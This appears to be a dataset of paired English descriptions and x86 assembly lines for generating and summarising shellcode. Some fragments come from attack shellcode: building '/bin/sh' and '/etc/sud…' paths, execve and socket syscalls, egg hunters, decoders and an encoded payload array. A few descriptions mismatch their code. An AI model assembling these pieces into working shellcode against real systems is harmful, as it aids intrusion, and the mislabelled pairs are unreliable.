ShellCodeGen: restore the top of the stack into the si register,pop si
"ShellCodeSum: msg db 'i love you!', 0ah",define msg variable and initialize with 'i love you!'
"ShellCodeSum: mov al, 20",move 20 into al
ShellCodeGen: push the byte 8 onto the stack,push byte 8
ShellCodeGen: right shift the contents of dl register by 4 bit positions,"shr dl, 4"
ShellCodeGen: swap the contents of the edi register with the contents of the eax register,"xchg edi, eax"
ShellCodeGen: right shift the contents of the edi register by the contents of the cl register,"shr ax, cl"
ShellCodeGen: compare the value in eax to the doubleword addressed by edi,scasd
ShellCodeSum: writestring:,define writestring function
ShellCodeGen: zero out the eax register and the ecx register,"xor ecx, ecx \n mul ecx"
ShellCodeGen: jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register,"cmp eax, eax \n jne 0x8"
ShellCodeSum: push 0x7369642d,push 0x7369642d onto the stack
"ShellCodeSum: mov eax, 48",make the system call signal
"ShellCodeSum: push byte 0x11 \n mov ebx, esp",push the byte 0x11 onto the stack and point ebx to the stack register
ShellCodeGen: jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register,"cmp ax, bx \n jne l3"
ShellCodeGen: push the contents of the ecx register onto the stack,push ecx
"ShellCodeSum: add al, 0x25",add 0x25 to the al register
ShellCodeGen: declare the fileaddress label,fileaddress:
"ShellCodeSum: push 0x69622f2f \n mov eax, esp",push the value 0x69622f2f onto the stack and point the eax register to the stack register
ShellCodeSum: not ax,negate all the bits of ax register
"ShellCodeGen: define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3","encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3"
ShellCodeGen: compare the contents of the eax register and the contents of the ebx register,"cmp eax, ebx"
ShellCodeGen: push double word 0x39396e2d onto the stack and point the esi register to the stack register,"push dword 0x39396e2d \n mov esi, esp"
ShellCodeSum: jmp call_egghunter,jump to the call_egghunter label
ShellCodeGen: push 0x636e2f2f onto the stack,push 0x636e2f2f
ShellCodeGen: use stdin,"mov ebx, 0"
ShellCodeGen: put the syscall 0x02 into the eax register,push byte 0x02 \n pop eax
"ShellCodeSum: mov edx, tmp",move the contents of tmp variable into edx
"ShellCodeSum: cmp edx, ebx \n je 0x8 \n mov ebx, edx",jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
"ShellCodeSum: mov eax, 11",make the system call execve
ShellCodeGen: restore the top of the stack into esi register,pop esi
ShellCodeGen: jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \n jnz IncAddr \n jmp edi
"ShellCodeSum: cmp eax, eax \n jne 0x8",if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8
ShellCodeGen: make syscall to terminate the program,int 80h
"ShellCodeSum: mov byte [esi+14], al",move al into the byte at address [esi+14]
"ShellCodeSum: add marks, 10",add 10 to the variable marks
"ShellCodeSum: sub ebx, 2",decrease ebx by 2
"ShellCodeSum: mov ebx, dword 0x50905091",move dword 0x50905091 into ebx
ShellCodeGen: push the value 0x64687373 onto the stack and point the edx register to the stack register,"push 0x64687373 \n mov edx, esp"
"ShellCodeSum: mov eax, 48",signal
ShellCodeSum: push byte +0x10,push the byte +0x10 onto the stack
ShellCodeGen: push the word 0x462d to the stack,push word 0x462d
ShellCodeGen: define the byte value bytes and initialize it to 20,bytes db 20
"ShellCodeSum: mov eax, msg",move the address of msg string into eax
ShellCodeGen: load the effective address of the result of the operation [esi+23] into the ebx register,"lea ebx, [esi+23]"
"ShellCodeSum: mov dword [esp-0x24], 0x732f636f",move the value 0x732f636f into the double word starting at the address [esp-0x24]
ShellCodeGen: jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address,"cmp dword [eax-8], egg \n jne _next"
ShellCodeGen: move the number of bytes of var2 into ecx,"mov ecx, type var2"
ShellCodeSum: not byte [var],negate all bits in the byte at the memory location var
ShellCodeGen: put the syscall 15 into the eax register,push byte 15 \n pop eax
ShellCodeSum: push dword 0x313a303a,push the double word 0x313a303a onto the stack
ShellCodeSum: dup2:,declare the dup2 label
ShellCodeGen: move the contents of the edx register into the ecx register,"mov ecx, edx"
"ShellCodeSum: mov eax, 0x2f766564",move 0x2f766564 into eax
ShellCodeGen: move childmsg into eax,"mov eax, childmsg"
ShellCodeGen: negate edi,neg edi
"ShellCodeSum: sub bl, cl \n jnz l2",subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
ShellCodeGen: swap the values si ebx and bx registers,"xchg si, bx"
ShellCodeGen: jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero,"xor ax, 0x539 \n jz decoded_shellcode"
"ShellCodeSum: cmp al, 0xf2 \n je _start",if the contents of the al register is equal to the value 0xf2 then jump to the _start label
"ShellCodeSum: mov ebx, [ebp-4]",move the contents of the address [ebp-4] into the ebx register
ShellCodeGen: pop the top of the stack into the eax register,pop eax
"ShellCodeSum: mov al, 0x42",move 0x42 into al
ShellCodeSum: push 0x7374736f,push the 0x7374736f onto the stack
ShellCodeSum: _while_loop:,define the _while_loop label
ShellCodeGen: negate all the bits of ecx register,not ecx
ShellCodeGen: system call mmap,"mov eax, 90"
"ShellCodeSum: mov dword [esp-0x1c], 0x656e7265",move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
ShellCodeGen: divide ebx by 2 using right shift,"shr ebx, 1"
ShellCodeSum: push 20,push the 20 onto the stack
"ShellCodeSum: cmp [ebp+arg_0], 1",compare the contents stored at ebp+arg_0 with 1
ShellCodeSum: push dword [ebp+16],push the dword [ebp+16] onto the stack
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7",if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
ShellCodeGen: push the value 0x68732f2f onto the stack,push 0x68732f2f
"ShellCodeSum: mov eax, edi",move edi into eax
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label,"cmp eax, ebx \n je exit"
ShellCodeGen: push the byte 0x3 onto the stack,push byte 0x3
ShellCodeGen: move 0xb5 into al,"mov al, 0xb5"
ShellCodeSum: pop eax,remove last character from the stack into edx
ShellCodeGen: increment eax,inc eax
ShellCodeSum: shift_decode:,define shift_decode label
"ShellCodeSum: test cl, cl",test the value of cl
ShellCodeSum: push 0x706d742f,push 0x706d742f onto the stack
"ShellCodeSum: mov ecx, 0777",move permissions to read write and execute into ecx
ShellCodeGen: multiply the contents of eax by ebx,mul ebx
"ShellCodeSum: mov bx, 1666",move 1666 into bx
"ShellCodeSum: mov cl, 0x2",move the value 0x2 into the cl register
ShellCodeGen: move the contents at memory address temp2 to ebx,"mov ebx, [temp2]"
ShellCodeGen: jump short to the label l1 if the contents of the ebx register is negative,"test ebx, ebx \n js short l1"
ShellCodeSum: dec eax,decrement eax
ShellCodeGen: allocate memory for local variables,"sub esp, 4"
ShellCodeGen: push the word 0x7773 to the stack,push word 0x7773
"ShellCodeSum: test ebx, ebx",test the contents of the ebx register
"ShellCodeSum: mov al, 0x04",move 0x04 into al
ShellCodeGen: push the byte +0x2 onto the stack,push byte +0x2
"ShellCodeSum: cmp dl, 1 \n je exit \n jmp reading",jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
ShellCodeGen: move 132 into dx,"mov dx, 132"
ShellCodeSum: jz _start,jump to the _start label if the zero flag is set
ShellCodeGen: decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero,loop decode
ShellCodeGen: move 0x16a into ax,"mov ax, 0x16a"
ShellCodeSum: push word 0x632d,push the word 0x632d to the stack
ShellCodeSum: call execute,call the execute function
ShellCodeGen: move 0x401 into cx,"mov cx, 0x401"
ShellCodeSum: dec edx,decrement the edx register by one
"ShellCodeSum: xor eax, eax",perform xor operation between eax and eax
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov eax, esp",push /bin/sh onto the stack and point the eax register to the stack register
"ShellCodeSum: sub dx, bx",subtract the contents of bx from the contents of dx
ShellCodeSum: me:,define me label
"ShellCodeSum: mov dword [esi + 8], ebx",move ebx into the dword at address [esi + 8]
ShellCodeSum: push 0x74652f2f,push 0x74652f2f onto the stack
ShellCodeGen: jump to the aslr_file label,jmp aslr_file
ShellCodeGen: divide edx by 4 using right shift,"shr edx, 2"
ShellCodeGen: move esi into edi,"mov edi, esi"
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label,"cmp BYTE [esi], 0x7 \n jl lowbound"
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp",move /bin/sh into the ebx register
ShellCodeSum: jz next_cycle,if zero jump to the next_cycle label
ShellCodeGen: move 10 into bl,"mov bl, 10"
ShellCodeGen: push the word 0x632d onto the stack and point the ecx register to the stack register,"push word 0x632d \n mov ecx, esp"
ShellCodeGen: define string as the byte string 'prova.txt',string: db 'prova.txt'
ShellCodeSum: _next:,define the _next label
ShellCodeGen: declare the fill label,fill:
ShellCodeGen: move the byte at the memory location specified by the operation [esi+1+ebp] into al,"mov al, byte [esi+1+ebp]"
ShellCodeGen: move 110 into the effective address saved in ebx,"mov [ebx], 110"
ShellCodeGen: move the contents of memory address esi+ecx into bl,"mov bl, [esi+ecx]"
"ShellCodeSum: add esi, 0x3f3f3f3f",add 0x3f3f3f3f to the contents in esi and save the result in esi
ShellCodeGen: push 16 onto the stack,push 16
"ShellCodeSum: mov ax, 45h",transfer the immediate constant 45h to ax
ShellCodeGen: push the word 0x0a onto the stack,push word 0x0a
ShellCodeGen: load the effective address of the operation [bp+0x08] into the bx register,"lea bx, [bp+0x08]"
ShellCodeGen: left rotate the byte in esi 2 times,"rol byte [esi], 0x2"
"ShellCodeSum: mov al, byte [esi+1+ebp]",move the byte at the memory location specified by the operation [esi+1+ebp] into al
ShellCodeSum: loop ROT_decode \n jmp short Shellcode,decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
ShellCodeGen: load the effective address of the result of the operation [esi+47] into the edx register,"lea edx, [esi+47]"
"ShellCodeSum: rol byte [esi], 0x2",left rotate the byte at the address esi by 0x2 bits
ShellCodeSum: push byte 0x17,push the byte 0x17 onto the stack
"ShellCodeSum: mov dx, 0xb01",move 0xb01 into dx
"ShellCodeSum: cmp DWORD [eax], edx \n jne loop \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
"ShellCodeSum: sub byte [ebp+ecx],20h",subtract 20h from the 8-bit at memory location ebp+ecx
"ShellCodeSum: mov al, 0x66",make the systemcall socketcall
ShellCodeSum: pushw 0x697a,push the 0x697a onto the stack
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov ebx, esp"
ShellCodeGen: invoke sys_unlink,"mov eax, 10"
ShellCodeGen: move dl into the address [ebx+0xe],"mov [ebx+0xe], dl"
ShellCodeSum: push byte 0x64,push the byte 0x64 to the stack
ShellCodeSum: push byte 2 \n pop eax,put the syscall 2 into the eax register
ShellCodeSum: string: db 'prova.txt',define string as the byte string 'prova.txt'
ShellCodeSum: int 0x80,system call interrupt 0x80
"ShellCodeSum: loop l4 \n mov edx, esp",decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
ShellCodeGen: move 0x42 into al,"mov al, 0x42"
ShellCodeGen: push esp to the stack,push esp
ShellCodeSum: push 0x69622f2f,push 0x69622f2f to the stack
ShellCodeGen: jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label,"cmp dl, 1 \n je exit \n jmp reading"
ShellCodeSum: int 80h,call sys_read to fill the buffer
ShellCodeSum: jmp_search:,define the jmp_search label
ShellCodeSum: push byte 10 \n pop eax,put the syscall 10 into the eax register
ShellCodeSum: dec eax,decrement the eax register by one
ShellCodeGen: call the decoder function,call decoder
ShellCodeGen: move dl into the byte in esi,"mov byte [esi], dl"
ShellCodeGen: move the memory address of buffer variable into eax,"mov eax, buffer"
ShellCodeGen: subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero,"sub bl, cl \n jnz l2"
ShellCodeSum: push byte 0x02,push the byte 0x02 onto the stack
"ShellCodeSum: mov [ebp-4], edi",move edi into the local memory address ebp-4
ShellCodeGen: initialize edi with 0,"xor edi, edi"
ShellCodeGen: declare the decode label,decode:
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point eax to the stack register,"push 0x2f2f2f2f \n mov eax, esp"
ShellCodeGen: if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else,"cmp ecx, edx \n ja l1"
ShellCodeGen: jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register,"cmp BYTE bl, [esi] \n jne loop_1"
"ShellCodeSum: sub eax, 8",subtract 8 from the contents of the eax register
"ShellCodeSum: mov cl, 30",move 30 into cl
ShellCodeSum: dec ebx,decrement ebx
ShellCodeGen: move 0x1 into cl,"mov cl, 0x1"
ShellCodeSum: jne 804809a,jump to 804809a if not equal
ShellCodeSum: key equ 0xdeadbeef,define key constant equal to 0xdeadbeef
ShellCodeSum: variablename2: resw 1,reserve 1 word for variableName2
ShellCodeGen: call the cont function,call cont
"ShellCodeSum: cmp al, 9 \n jge l1",jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
ShellCodeGen: declare the path label,path:
ShellCodeGen: if the contents of the al register is equal to the value 0xf2 then jump to the _start label,"cmp al, 0xf2 \n je _start"
ShellCodeGen: load the effective address [zero_reg+117] into ecx,"lea ecx, [zero_reg+117]"
"ShellCodeSum: mov ebx, eax",move eax into ebx
ShellCodeGen: push 0x61702f2f onto the stack,push 0x61702f2f
"ShellCodeSum: mov a_letter, al",move al into memory address a_letter
ShellCodeGen: if not equal jump short to the _while_loop,jne short _while_loop
"ShellCodeSum: cmp dword [eax-8], egg \n jne _next",if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
"ShellCodeSum: mov byte [eax], dl",move dl into the byte at address [eax]
ShellCodeGen: compare the contents of the ecx register with the contents of the ebp register,"cmp ecx, ebp"
"ShellCodeSum: shl eax, 1",multiply the value of eax by 2
ShellCodeGen: move the byte in esi into al,"mov al, byte [esi]"
ShellCodeSum: push dword 0x72657355,push the dword 0x72657355 onto the stack
ShellCodeGen: push the zero_reg onto the stack,push zero_reg
ShellCodeGen: declare the loop label,loop:
ShellCodeGen: jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register,"cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193"
"ShellCodeSum: mov dl, len",move the contents stored at the address len into the dl register
ShellCodeSum: push ebp,push the contents of the ebp register onto the stack
ShellCodeSum: push dword 0x303a3a31,push the double word 0x303a3a31 onto the stack
ShellCodeSum: call_shellcode:,define the call_shellcode label
ShellCodeGen: jump to the _start label,jmp _start
ShellCodeGen: declare buffersize to be a word containing 1024,buffersize: dw 1024
ShellCodeGen: compare the byte in esi with 0x7,"cmp byte [esi], 0x7"
ShellCodeGen: call the writestring function,call writestring
"ShellCodeSum: mov dword [esp-0xc], 0x735f6176",move the value 0x735f6176 into the double word starting at the address [esp-0xc]
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point esi to the stack register,"push 0x2f2f2f2f \n mov esi, esp"
ShellCodeSum: pop eax,remove last character from the stack into eax
ShellCodeSum: jmp shell,jump to the shell label
ShellCodeGen: move the effective address of byte_tbl+2 to al register,"mov al, [byte_tbl+2]"
ShellCodeSum: call me,call the me function
ShellCodeGen: if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register,"cmp dword [eax-4], egg2 \n je _next \n jmp eax"
"ShellCodeSum: mov byte al, 83",move 83 into the byte at address al
ShellCodeGen: push $0x632d onto the stack,pushw $0x632d
ShellCodeGen: move memory word_value to register bx,"mov bx, word_value"
"ShellCodeSum: mov [1000h], ax",move the value of ax into memory at address 1000h
"ShellCodeSum: xor ecx, ecx \n push ecx",push zero onto the stack
ShellCodeGen: call the _write function,call _write
ShellCodeGen: subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero,"sub al, 1 \n jnz l1"
ShellCodeGen: if the contents of the dl register is greater than the decimal value 27 then jump to the label l3,"cmp dl, 27 \n jg l3"
ShellCodeGen: push the byte +0x66 onto the stack,push byte +0x66
ShellCodeGen: perform a logical xor between the dl register and 0xbb and save the result in dl,"xor dl, 0xbb"
ShellCodeGen: restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit,"pop ecx \n loop l2 \n mov eax, 1"
ShellCodeGen: move the contents at memory address x to ebx,"mov ebx, [x]"
ShellCodeGen: move number 9 into ebx,"mov ebx, 9"
ShellCodeGen: jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero,"xor cl, 0XAA \n jz shift_decode"
ShellCodeSum: push word 0x2923,push 0x2923 onto stack port
ShellCodeGen: push the byte 0x17 onto the stack,push byte 0x17
ShellCodeGen: push the value 0x69622f2f onto the stack and point the edx register to the stack register,"push 0x69622f2f \n mov edx, esp"
"ShellCodeSum: mov ecx, esp",move address of stack pointer into ecx
"ShellCodeSum: mov cl, 30",move 30 to the cl register
ShellCodeGen: define the byte string '/bin/sh#sh#',db '/bin/sh#sh#'
ShellCodeGen: move eax to ebp,"mov ebp, eax"
ShellCodeGen: jump short to the _execline label,jmp short _execline
ShellCodeSum: push 0x3170762d,push 0x3170762d onto the stack
ShellCodeGen: push 20 onto the stack,push 20
"ShellCodeSum: mov eax, 3",make the system call to read the file
ShellCodeSum: main_inc:,create label main_inc
ShellCodeGen: if zero flag is set jump to nomoreargs label,jz nomoreargs
ShellCodeGen: right rotate esi 1 time,"ror esi, 1"
ShellCodeGen: restore the top of the stack into eax register,pop eax
ShellCodeGen: move dl into al,"mov al, dl"
"ShellCodeSum: mov ebx, edi",move edi into ebx
ShellCodeGen: define formatting label,formatting:
ShellCodeSum: dec ecx,decrement the contents of the ecx register
ShellCodeGen: move the byte at the address 66h into al,"mov al, byte 66h"
"ShellCodeSum: mov ax, 0x16c",move 0x16c into ax
ShellCodeSum: push 0x6d726574,push 0x6d726574 onto the stack
"ShellCodeSum: xor cl, 0xAA \n jnz Next_Cycle",jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero
"ShellCodeSum: mov long [esi+26], eax",move the contents of the eax register into the long starting at the address [esi+26]
ShellCodeGen: do no operation,nop
ShellCodeGen: move the address of msg string into eax,"mov eax, msg"
ShellCodeGen: if the contents of the eax register is zero then jump to the label proc_name,"test eax, eax \n jz proc_name"
ShellCodeGen: subtract 20h from the 8-bit at memory location buff,"sub byte [buff],20h"
ShellCodeGen: declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte,"str db 'hello',0"
ShellCodeSum: set_argv:,define set_argv label
ShellCodeGen: move the 3rd element of the array byte_table into cl,"mov cl, byte_table[2]"
ShellCodeGen: multiply the contents of eax by 3,mul 3
ShellCodeSum: jmp connec,jump to connec
ShellCodeGen: add 0x2 to the contents of ebp,"add ebp, 0x2"
ShellCodeGen: define close_syscall equal to 6,close_syscall equ 6
ShellCodeGen: decrement ebp,dec ebp
ShellCodeGen: declare msglength to have the constant value 12,msglength: equ 12
ShellCodeGen: push the dword 0x6374652f onto the stack,push dword 0x6374652f
ShellCodeSum: push byte 9,push the byte 9 onto the stack
ShellCodeGen: define a byte string and initialize it to '/bin/sh',db '/bin/sh'
ShellCodeSum: cycle:,declare the cycle label
ShellCodeGen: jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register,"cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax"
ShellCodeSum: jnz 1,if not zero jump to numeric label 1
"ShellCodeSum: mov eax, 3",move 3 to the eax register
"ShellCodeSum: mov [esi+34], al",move al into the address [esi+34]
ShellCodeGen: pop the top of the stack into the edx register,pop edx
ShellCodeGen: swap the values of ebx and esp registers,"xchg ebx, esp"
ShellCodeGen: subtract 20000h from eax register,"sub eax,20000h"
ShellCodeGen: push 0x2f6e6962 to the stack,push 0x2f6e6962
ShellCodeGen: declare the setup label,setup:
ShellCodeSum: push byte 0x3,push the byte 0x3 onto the stack
ShellCodeSum: push byte 70,push the byte 70 onto the stack
ShellCodeSum: push 0x746f6f72,push 0x746f6f72 onto the stack
ShellCodeSum: push byte chmod_call,push the byte chmod_call onto the stack
"ShellCodeSum: push word 0x632d \n mov esi, esp",push the word 0x632d onto the stack and point the esi register to the stack register
ShellCodeGen: if zero jump to the child label,jz child
ShellCodeGen: push 0x30313a31 to the stack,push 0x30313a31
ShellCodeGen: create a string 'hello world!' plus a linefeed character,"hello: db 'hello world!',10"
ShellCodeGen: place address buff into esi,"mov esi, buff"
ShellCodeSum: div dword [value],divide the contents of eax by the word value stored at memory location value
"ShellCodeSum: mov eax, ecx",move the value of ecx into eax
"ShellCodeSum: mov byte [esi], dl",move dl into the byte in esi
ShellCodeSum: push byte 0x1c,push the byte 0x1c onto the stack
ShellCodeGen: read the file,"mov eax, 3"
ShellCodeGen: clear the ecx register,"xor ecx, ecx"
ShellCodeSum: inc ebx,increment ebx
ShellCodeSum: call _printf,call the _printf function
ShellCodeGen: load the effective address [zero_reg+3] into eax,"lea eax, [zero_reg+3]"
"ShellCodeSum: xchg [ebp+16], ecx",swap the address [ebp+16] with the contents of the ecx register
ShellCodeGen: push the value 0x6e7a762d onto the stack and point the ebp register to the stack register,"push 0x6e7a762d \n mov ebp, esp"
ShellCodeGen: invoke sys_socketcall,"mov eax, 102"
"ShellCodeSum: mov bl, byte [edi]",move the byte at the address [edi] into bl
"ShellCodeSum: mov cl, 0x3",move 0x3 into cl
"ShellCodeSum: add eax, ebx",add ebx to eax
ShellCodeGen: push 0x45683933 onto the stack,push 0x45683933
"ShellCodeSum: mov al, byte 3fh",move the byte at the address 3fh into al
ShellCodeGen: move the value of ecx into eax,"mov eax, ecx"
"ShellCodeSum: cmp edx, 10",compare whether the edx register has reached 10
ShellCodeGen: push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register,"push 0x6e69622f \n push 0x7273752f \n mov ebx, esp"
ShellCodeSum: je short encodedshellcode,jump short to encodedshellcode if equal
ShellCodeGen: add the contents of the bh register into the ah register,"add ah, bh"
"ShellCodeSum: mov eax, addr",move addr into eax
"ShellCodeSum: shr edx, byte 16",right shift the contents of the edx register by the byte 16
ShellCodeGen: move mxcsr to eax,"mov eax, mxcsr"
ShellCodeGen: push esp onto the stack,push esp
ShellCodeGen: push 0x742f3a31 onto the stack,push 0x742f3a31
"ShellCodeSum: test al, al \n jz found \n inc ecx",jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
ShellCodeSum: not esi,negate all the bits of the esi register
ShellCodeGen: compare the contents of eax and the contents of eax,"cmp eax, eax"
ShellCodeSum: var db 64,declare a byte containing the value 64 at label the memory location var
"ShellCodeSum: mov byte [esp], 0x2e",move 0x2e into the byte in esp
ShellCodeGen: put the offset of hello in ecx,"mov ecx, hello"
"ShellCodeSum: mov bl, 0x4",move 0x4 into bl
ShellCodeGen: jump to the exit_on_error label if the zero flag is cleared,jnz exit_on_error
ShellCodeGen: multiply ebx by 2 using left shift,"shl ebx, 1"
"ShellCodeSum: mov al, 23",move 23 into al
ShellCodeGen: push 0x203a4457 onto the stack,push 0x203a4457
ShellCodeGen: if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register,"test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6"
ShellCodeSum: push ecx,push the contents of the ecx register onto the stack
ShellCodeSum: popad,move doublewords from the stack into the general purpose registers
ShellCodeGen: push the contents of eax onto the stack,push eax
"ShellCodeSum: sub bl, 3",subtract 3 from the contents of the bl register
"ShellCodeSum: push 0x6374652f \n mov eax, esp",push the value 0x6374652f onto the stack and point eax to the stack register
ShellCodeGen: subtract the contents of cx from the contents of cx,"sub cx, cx"
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: move eax to x variable,"mov x, eax"
ShellCodeGen: push the 0x31373737 onto the stack,push 0x31373737
ShellCodeGen: move the byte 6h into al,"mov al, byte 6h"
"ShellCodeSum: mov eax, n_src",move n_src to eax
ShellCodeSum: dec ecx,decrement ecx
"ShellCodeSum: mov edx, esp",move address of stack pointer into edx
ShellCodeSum: pop [eax],pop the top element of the stack into memory at the four bytes starting at location eax
ShellCodeSum: jnc 0xd8,jump to 0xd8 it the carry flag is zero
ShellCodeGen: push the word 0x2e2e onto the stack,push word 0x2e2e
ShellCodeGen: swap the contents of the ebx register with the contents of the esp register,"xchg ebx, esp"
ShellCodeGen: copy my_var contents in ax,"mov ax, [my_var]"
ShellCodeGen: define main label,main:
ShellCodeGen: push the byte 0x64 to the stack,push byte 0x64
ShellCodeGen: push 0x69622f3a onto the stack,push 0x69622f3a
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov ebx, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
ShellCodeGen: move a byte from the address esi+ecx into al,"mov al, byte [esi+ecx]"
ShellCodeGen: load the effective address of the result of the operation [ecx+0bh] into the eax register,"lea eax, [ecx+0bh]"
"ShellCodeSum: mov al, 0x21",move 0x21 into al
"ShellCodeSum: lea eax, [ebx+8]",put the address of ebx+8 into eax
ShellCodeSum: pushw $0x632d,push $0x632d onto the stack
ShellCodeGen: jump to two,jmp two
"ShellCodeSum: lea ebx, [esi+14]",load the effective address of the result of the operation [esi+14] into the ebx register
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov edx, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register
"ShellCodeSum: xchg edx, eax",exchange edx with eax
ShellCodeGen: push the dword 0x7461632f onto the stack,push dword 0x7461632f
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp",put /bin/sh into ecx
ShellCodeGen: syscall 102,"mov al, 0x66"
ShellCodeGen: divide the contents of eax by the word value stored at memory location value,div dword [value]
"ShellCodeSum: xor bx,bx",zero out bx register
ShellCodeGen: load the value of register ebx into register esp,"lea esp, [ebx]"
ShellCodeGen: move 0x735f6176 into esi,"mov esi, 0x735f6176"
ShellCodeSum: exit:,define the exit label
ShellCodeSum: push dword 0x6e69922f,push the dword 0x6e69922f onto the stack
ShellCodeGen: push double word 0x74652f2f onto the stack and point the edx register to the stack register,"push dword 0x74652f2f \n mov edx, esp"
ShellCodeSum: call _exit,call _exit
"ShellCodeSum: test al, al",test the value of the al register
ShellCodeGen: push 0x7369642d onto the stack,push 0x7369642d
ShellCodeGen: move al into the byte in esi,"mov byte [esi], al"
"ShellCodeSum: shr edx, 2",divide edx by 4 using right shift
ShellCodeSum: push 0x4f4e2029,push 0x4f4e2029 onto the stack
ShellCodeGen: swap the contents of eax and ebx,"xchg eax, ebx"
ShellCodeGen: push the value 0x7 onto the stack and point edx to the stack register,"push 0x7 \n mov edx, esp"
ShellCodeSum: je stop,jump to label stop if equal
"ShellCodeSum: push 0x6374652f \n mov edi, esp",push the value 0x6374652f onto the stack and point edi to the stack register
ShellCodeGen: call the code function,call code
ShellCodeGen: jump to the _while_loop label,jmp _while_loop
ShellCodeSum: push byte 0x01,push the byte 0x01 to the stack
ShellCodeGen: subtract 1662 from the contents of ax register and save the result in ax,"sub ax, 1662"
"ShellCodeSum: mov eax, 90",system call mmap
ShellCodeGen: move 72h into al,"mov al, 72h"
"ShellCodeSum: lea ebx, [esi]",load the effective address of esi into the ebx register
"ShellCodeSum: mov al, 5 \n dec al \n jnz l2",move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
ShellCodeSum: push 0x46,push 0x46 onto the stack
ShellCodeGen: jump to the all label if the contents of the eax register is equal to the contents of the ebx register,"cmp eax, ebx \n je all"
ShellCodeGen: push the word 0x662d onto the stack and point the edx register to the stack register,"push word 0x662d \n mov edx, esp"
ShellCodeGen: if the contents of the cl register is greater than the decimal value 12 then jump to the label l2,"cmp cl, 12 \n jg l2"
"ShellCodeSum: xor [ecx + 116], dh",perform xor operation between the value stored at the location ecx+116 and dh
"ShellCodeSum: mov edx, [temp4]",move the contents at memory address temp4 to edx
ShellCodeGen: move 0x0b into al,"mov al, 0x0b"
ShellCodeSum: jnz decode,jump to the decode label if the zero flag is cleared
ShellCodeSum: jmp nextchar,jump to the point in the code labeled nextchar
ShellCodeSum: db '/sbin/insmod#/tmp/o.o',define the byte string '/sbin/insmod#/tmp/o.o'
"ShellCodeSum: add eax, ebx",add the contents of ebx to the contents of eax
